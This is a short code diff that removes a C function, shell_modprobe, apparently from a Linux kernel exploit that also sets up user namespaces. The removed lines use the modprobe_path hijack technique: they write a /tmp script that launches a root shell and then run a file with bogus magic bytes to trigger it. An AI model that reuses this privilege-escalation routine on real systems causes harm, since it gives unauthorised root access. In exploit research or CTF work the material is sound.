@@ -173,13 +173,3 @@ void unshare_setup(uid_t uid, gid_t gid)
 
     return;
 }
-
-void shell_modprobe(void)
-{
-    system("echo '#!/bin/sh' > /tmp/x; \
-            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
-    system("chmod +x /tmp/x");
-    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
-    system("chmod +x /tmp/y");
-    system("/tmp/y");
-}
